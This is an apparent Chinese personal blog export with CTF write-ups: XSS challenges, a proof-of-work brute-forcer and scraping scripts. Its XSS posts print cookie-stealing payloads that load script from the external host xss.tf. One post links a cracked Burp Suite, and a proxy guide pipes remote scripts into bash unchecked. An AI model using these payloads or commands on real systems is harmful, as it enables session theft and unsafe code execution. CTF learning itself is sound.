[{"title":"XSS 题目解析（上篇）","date":"2019-04-09T04:03:33.734Z","path":"2019/04/09/XSS 题目解析（上篇）/","text":"在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。 12345678910from itertools import countimport hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()for i in count(100000): if md5(str(i)).startswith(&apos;49ab02&apos;): print(i) break 使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。 知道了怎么获取这个验证码现在开始解题。 第一题：Baby XSS 根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的cookies然后通过Burp Suite工具修改登录时的cookies就可以了。 现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。 先试探一下目标有没有设置过滤机制。 1&lt;script&gt;alert(1)&lt;/script&gt; 发送成功，我们可以点Click me to view 看一下运行情况。看来代码被原样执行了，没有做过滤处理。这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。http://xss.tf创建一个项目使用默认模块就可以。配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。 我们选择直接插入script标签的方式。 1&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt; 这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。成功钓到了admin，展开后可以看到cookies。接下来就很简单了使用Burp Suite修改cookies就可以了。我给出一个永久破解版的Burp Suite但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q 提取码：qun1 先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/ 开启intercept后，再点一下admin.php。把cookies改成刚才获取到的cookies再点forward。flag到手。 第二题：XSS 1 题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。 先点开xss.php看一下。从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。 1&quot;;alert(1);// 如果这段代码可以成插入，那么script标签将会变成 1var a=&quot;&quot;;alert(1);//&apos;; 实验果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。 看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。 可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。 使用编码工具对上面的语句进行转码。把编码后的内容提交一下看看。OK，成功执行。那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。可以看到灰色的script标签并没有被解析。所以我们只能使用write()或者createElement()方法来把script写到body里面。 123&quot;;document.write(&quot;&lt;sCrIpt srC=http://xss.tf/Vw6&gt;&lt;/sCRipT&gt;&quot;);// 编码之后写入表单可以看到script标签被加到了svg里面，无法引用外部 js。我们需要在body里面创建标签。所以使用createElement()方法。 12345&quot;;var s=document.createElement(&apos;script&apos;);document.body.appendChild(s);s.src=&quot;http://xss.tf/Vw6&quot;;// 写入之后发现OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。 回到题目页面把你编码后的代码放到示例URL后面提交后发现代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。提交编码。flag在cookies里面。","comments":true,"tags":[]},{"title":"XSS 随笔 02","date":"2019-04-08T15:37:00.240Z","path":"2019/04/08/XSS 随笔 03/","text":"这两天一直肝到两点多才睡觉，今天终于搞完了实在是坚持不了了，就先写这一篇XSS简介吧，具体的攻击步骤明天再发吧！","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"什么是 XSS","date":"2019-04-08T15:34:10.787Z","path":"2019/04/08/什么是XSS/","text":"这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。 XSS 分类 第一种：反射型 XSS 反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。 1234567&lt;?php if(isset($_GET[&apos;name&apos;]))&#123; $text=$_GET[&apos;name&apos;]; echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; &#125; echo &apos;&lt;hr /&gt;&apos;; ?&gt; 这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。 1http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 代码被执行了，用户cookies被打印出来。第二种：存储型 XSS 存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。 1&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt; 这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。 第三种：DOM Based XSS 实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。 12345678910&lt;script&gt;function fun()&#123; var str=document.getElementById(&quot;text&quot;).value; var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;&#125;&lt;/script&gt;&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;fun()&quot; /&gt; 页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。 1&apos; onclick=alert(document.cookie) // 点击链接用户信息被输出。这里用到了闭合的技巧会在下一篇博文中讲到。 这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。","comments":true,"tags":[]},{"title":"XSS 随笔 02","date":"2019-04-08T02:53:36.445Z","path":"2019/04/08/XSS随笔02/","text":"昨晚肝到两点总算是突破了防线，然而却因为漏了一个分号最后也没搞出来。今早上改好了，成功又解出来一道。干脆一鼓作气做完最后一道XSS再一起发步骤吧。","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"XSS 随笔","date":"2019-04-07T12:54:48.258Z","path":"2019/04/07/XSS 随笔01/","text":"第一次遇到XSS的题目，由于做错了题目顺序，直接从第二道题做的，所以搞了一天多也没成功。多亏学长提示从第一题入门开始做，结果由于这两天的学习很快就完成了第一道题。使用的是XSS Hunter的payload抓的cookies。笔记还没整理，打算在努力一下把第二道题攻克以后一起发详细步骤，大体内容就是XSS的攻击方式，以及关于proof of work的一点知识吧。再次感谢学长！","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"VPS服务器搭建SSR/SS","date":"2019-04-06T06:02:53.301Z","path":"2019/04/06/VPS服务器搭建SSR_SS/","text":"实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。服务器：vultr（比较实惠、稳定的国外服务器）工具：xshell、shadowstocks、bbr、代理服务设置工具（下边会给出链接）首先是搞到服务器，去vultr注册账号。https://www.vultr.com/填写邮箱和密码，会给你发个邮件激活账号。先进性账户充值，充值最低10美元起。倒数2、3分别是微信和支付宝，扫码支付就可以了。 选择服务器选一个适合你的（延迟低的服务器）推荐日本和美国。如果不清楚哪个延迟低可以去这里测试一下http://ga-us-ping.vultr.com/ms越低越好。 选择系统和机器由于我使用kali较多所以我选了Debian，无特殊需求选默认的CentOS就可以了。机器的话如果仅仅用来fan墙，最便宜的就足够了。 后面的选项对此次的目的来说没有意义，因此全部采用的默认，具体功能自行了解。最后点击下方deploy now。 这样我们就有了一台自己的海外服务器。点击你的服务器进入详页可以看到你服务器IP和用户名、密码。后边会用到。下载xshell 链接：https://pan.baidu.com/s/11FRT_RPIVZjyvMkjx-zYbA 提取码：ffki安装完毕后新建连接。名字随意，主机号就是你申请的副武器的IP，端口一般默认22，可以自己修改。点击确定并连接主机。输入服务器的用户名密码。连接服务器。如图表示连接成功。 输入 1wget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 如果失败则先输入下面的指令再次运行上面的指令 1yum -y install wget 运行完成后出现如下提示，输入数字1安装ssr服务端输入端口和账号密码，端口的可选范围为60~65535。选择加密方式，输入对应数字即可，下面机几个操作的选择取决于个人，作者均采用默认设置。协议插件设置混淆（通过代理玩游戏推荐第一个速度快一些）设备限制空（回车）默认无限制，需要对访问速度加以限制的自己输入速率上限就行。下载文件安装完成后会显示相关信息，记得保存。若不慎关闭可以输入bash ssr.sh进入管理界面根据提示查看或者修改信息。重启服务器，可以再界面输入reboot也可以在你的vultr管理界面里重启。 安装BBR加速器，输入如下指令 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 按任意键安装。完成后提示重启服务器选择Y或手动重启。重启后输入lsmod | grep bbr查看是否安装成功。如上图安装成功。 下载代理设置工具 链接：https://pan.baidu.com/s/1_68i7TxfdT4lv3Kupge2wQ 提取码：z8jh 把之前保存的ssr配置信息填上。 设置浏览器的代理服务，地址127.0.0.1端口1080。使用全局模式所有浏览器就都可以使用代理服务了。Chrome可以使用自己的SwitchyOmega插件来定制自己的代理服务，但是这个插件的官方链接也被墙了，这里给出一个离线下载https://chrome-extension-downloader.com/。使用很简单实在不懂就Baidu一下吧。 至此vps服务器搭建ssr/ss就完成了，效果。","comments":true,"tags":[]},{"title":"SVG 图片验证码解码","date":"2019-04-05T13:28:43.169Z","path":"2019/04/05/SVG 图片验证码解码/","text":"环境：Python 3外部依赖：requests、bs4、BeautifulSoup、base64先看题目：题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/下面是解题过程：查看网页代码是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。回归主题，把这个图片单独拿出来看一下就是这个样子，可以看到URL的base64后面跟了一大堆乱码，这就是加密的xml文档，F12可以看到解密以后的样子，当然也可以通过各种解密工具查看。那么我们就有两种思路，第一种就是像这样靠浏览器来解码然后抓解码后的内容，如果这么做就完全变成抓包游戏了，所以我更推荐第二种本地解码。先抓取题目的原始页面，然后通过简单的字符切割获取那段乱码字符串，方法见上面链接，这里只给出代码： 123response = requests.get(url)soup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1] 接下来重点就是解码，使用base64包解码。 12import base64enc = base64.b64decode(src) 可以把解码后的内容打印输出看一下，会发现跟浏览器的显示一样这里就不放图片了。下面的内容就很简单了，上方连接使用的关键字提取方法一样，只需要把text标签里面的内容提取出来组和并提交就可以了。但是结果会发现提交的结果是Wrong。仔细观察图片和浏览器里的解码后的代码会发现text中字符的排列顺序并不是想要的顺序，如上代码的前两个字符是D u 但是图片是t S。原来图片中的字符顺序是根据x轴的位置决定的，那么我们就需要对获取的文本重新排序了。 鉴于我的Python学的跟shi一样（正在重学）所以以下内容仅供参考，比我方法好的比比皆是。 将解码的文件转换为BeautifulSoup对象 1soup = BeautifulSoup(enc, &quot;xml&quot;) 查找所有text标签并返回tag对象，将tag对象的x轴的值转换为int类，并且连同text里面的字符逐个付给一个空的list列表。 1234List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string]) tag是soup.find()返回的对象类型，具体关于BeautifuSsoup的使用可以参考官文https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ 接下来只需要使用list的排序功能就可以了，由于我把x的值作为了第一个属性所以无需指定排序关键字，放到第二个的话需要手动指定，步骤很简单自行搜索即可。 1List.sort() 可以输出看一下字符的顺序按照离x轴的距离拍好了。最后取出里面的字符组合起来就可以了。 1234getString = &quot;&quot;for c in List: getString += c[1] 剩下的就是提交了这里就不重复了。最后结果OK，最后完整代码 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupimport base64url = &quot;http://example.com/&quot;response = requests.get(url)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1]enc = base64.b64decode(src)soup = BeautifulSoup(enc, &quot;xml&quot;)List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string])List.sort()getString = &quot;&quot;for c in List: getString += c[1]response = requests.get(url + &quot;?code=&quot; + getString, cookies = Cookies)print(response.text) 最最后附上Python的其他编码解码方式。转载：https://blog.csdn.net/five3/article/details/83626446","comments":true,"tags":[]},{"title":"Python 简单的网页抓取和提交表单","date":"2019-04-05T12:43:39.996Z","path":"2019/04/05/Python 简单的网页抓取和提交表单/","text":"环境说明：Python 3外部依赖：requests、bs4、BeautifulSoup先看题目 题目很简单，就是限时计算给出的算式并提交。方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。方法二、使用网络爬虫。爬虫的话自然使用Python是最方便不过的，大体思路就是抓取公式-&gt;计算-&gt;提交。既然是做题那么首先第一步肯定是化简，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。可以很明显看到公式采用的是x1+x2*x3-x4的固定格式。那这就简单多了，不需要判断运算符也不用修改运算顺序，直接省去了一个heap的工作量。再来看一下代码。可以看到表单使用Get传值，传递对象是自己。GET使用URL传递参数，来测试一下URL。提交前：提交后：可以看到answer的值被脚本通过URL捕获并显示相关内容。现在的工作具体为抓取抓取公式-&gt;计算-&gt;生成URL-&gt;提交先来完成前两步工作：新建一个py文件，引入抓包用的requests和分析HTML结构的bs4. 12import requestsfrom bs4 import BeautifulSoup 向指定页面发送GET请求并获取响应 1response = requests.get(&quot;http://example.com/&quot;) 得到的response响应可以以content（二进制流）、text（文本）等多种格式输出，作为文本的时候还可以指定编码格式。现以text格式输出一下看看结果。 1print(response.text) 毫无疑问我们成功抓到了页面内容。下面需要获取公式。 12345678soup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6]) 先把获取的文本转成BeautifulSoup对象，通过字符串截取和强制转换变成单个数字并计算。由于已经确定运算符和运算规则这里就容易很多。然后把答案插入到URL并发送GET请求 1response = requests.get(&quot;http://example.com/calculator/?answer=&quot; + &apos;%d&apos; % Sum) 然后你会发现提示问题页面还未建立，没有问题何来答案。简述一下HTTP请求的规则：HTTP请求的三次握手客户端向服务端发送syn=1，seq=client请求的ID;服务端向客户端发送syn=1,seq=服务端请求的ID,ack=客户端请求的ID+1;客户端向服务端发送syn=0,seq=客户端请求的ID+1,ack=服务端请求的ID+1,data\\data…所以简单来说就是HTTP向服务器发送请求时会有一个专属ID来让服务器和客户端保持连接，这个ID存在于cookies里面。如果不连同cookies发送给服务器，那么服务器就会认为是两个不同的客户发送的请求从而出现上面的错误。所以我们要做的是连同cookies一起发送。先从response里面获取cookies并保存。 1Cookies = response.cookies 修改二次请求 1response = requests.get(&quot;http://example.com/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies) 再来看一下结果成功！总结：这道题比较基础，简单的使用了Python的爬虫功能，主要是学习了HTTP请求的过程，关键在于cookies的传递。 忘记放出完整代码了，补上！ 123456789101112131415161718import requestsfrom bs4 import BeautifulSoupresponse = requests.get(&quot;http://123.207.149.64:23331/calculator/&quot;)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6])response = requests.get(&quot;http://123.207.149.64:23331/calculator/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)print(response.text) 后面打算写一篇关于POST传递的使用方式和详细的HTTP请求的相关知识","comments":true,"tags":[]},{"title":"4-5日随笔","date":"2019-04-05T01:41:51.171Z","path":"2019/04/05/4-5/","text":"清明回老家，早上先把题目看了一下，还是一道网络爬虫的题目，不过这次待解密的数据是用svg+xml绘制的验证码刚好之前接触canvas的时候了解过svg，先手动解密了一下，晚上回来写脚本。","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"关于Python的使用","date":"2019-04-04T08:35:03.172Z","path":"2019/04/04/关于Python的使用/","text":"今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。下面是一些安装问题，你可以去官网下载Python 3并安装，https://www.python.org/ Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，https://www.anaconda.com/ 提供了 Python 2，Python 3 两个版本。关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。https://thonny.org/比较常见的是pyCharm，操作模式类似于eclipse，功能强大代，码高亮，自动填写做的很好。项目管理很方便，可以跨平台。可以很方便的管理库文件，添加外部依赖等等。提供了免费及收费两个版本。没什么大缺点，就是对外部包引入的搜索方式有时候会让人头大。明明项目里都显示有package了就是import不进来。https://www.jetbrains.com/pycharm/download/#section=windows另外推荐一个交互式笔记本，Jupyter notebook（又称IPython notebook）支持运行超过40种编程语言。安装教程十分简单。跨平台，实时代码编辑。缺点，关键词高亮很差，语法检测很弱，有时候错误语法照样可以运行。https://jupyter.org/对于热衷文本编辑器的人员可以使用sublime，另外C、Java程序员可以使用vs和eclipse。Linux推荐vim。关于同时使用Python 2 和 Python 3，如果确实需要两个环境的话。可以参考这篇文章https://www.cnblogs.com/zhengyihan1216/p/6011640.html简述一下就是安装第一个Python的时候记得把Python.exe改个别名，并且使用pip的时候要对应Python版本，最后分别添加path就可以了。下一篇介绍如何简单的使用 requests package抓取页面和表单提交。","comments":true,"tags":[]},{"title":"First Article","date":"2019-04-03T12:24:54.992Z","path":"2019/04/03/first blog/","text":"早上看了一下之前的Github实在是不忍直视还是重新制作一个吧。使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦。偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。 既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"Hello World","date":"2019-04-03T03:37:59.399Z","path":"2019/04/03/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","comments":true,"tags":[]}]